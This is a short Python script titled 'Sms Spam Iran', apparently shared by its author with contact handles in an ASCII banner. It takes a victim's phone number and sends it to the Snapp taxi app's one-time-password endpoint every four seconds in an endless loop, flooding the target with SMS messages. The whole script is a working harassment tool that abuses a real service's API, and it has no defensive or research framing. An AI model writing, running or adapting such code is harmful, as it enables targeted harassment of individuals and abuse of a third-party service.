print("""                                
  _____                            ____
|_   _|__  _ __ ___   ___  _ __  / ___| _ __ ___  ___
  | |/ _ \| '_ ` _ \ / _ \| '__| \___ \| '_ ` _ \/ __|
  | | (_) | | | | | | (_) | |     ___) | | | | | \__ \
  |_|\___/|_| |_| |_|\___/|_|    |____/|_| |_| |_|___/
# Sms Spam Iran #

Creator : Mohammad 
Rubika :@Tomor_apk
Wat : +12487645338

....................................
""")

import requests
import time

try:
    print("Note : For Exit Tools ==> Ctrl + C \n")
    NumberPhone = input("Enter Number Phone (ex: 9170000000) = ")

    if NumberPhone == "" :
        print("\n[!] Please Enter Phone Number")
    else :
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        data = {"cellphone":"+98" + NumberPhone}

    while True:
        requests.post(url,data=data)
        print("[+] Send SMS For Victim")
        time.sleep(4)
except:
    print("\n[-] You Exit Tools !!")
